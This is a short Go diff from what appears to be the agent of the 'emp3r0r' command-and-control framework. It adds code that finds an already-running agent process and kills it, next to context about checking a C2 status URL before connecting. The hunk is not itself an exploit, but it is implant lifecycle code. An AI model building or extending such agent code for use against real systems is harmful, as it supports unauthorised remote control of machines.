@@ -27,6 +27,18 @@ func main() {
 			}
 		}
 	}
+	// if the agent's process name is not "emp3r0r"
+	alive, pid := agent.IsAgentRunning()
+	if alive {
+		proc, err := os.FindProcess(pid)
+		if err != nil {
+			log.Println("WTF? The agent is not running, or is it?")
+		}
+		err = proc.Kill()
+		if err != nil {
+			log.Println("Failed to kill old emp3r0r", err)
+		}
+	}
 
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
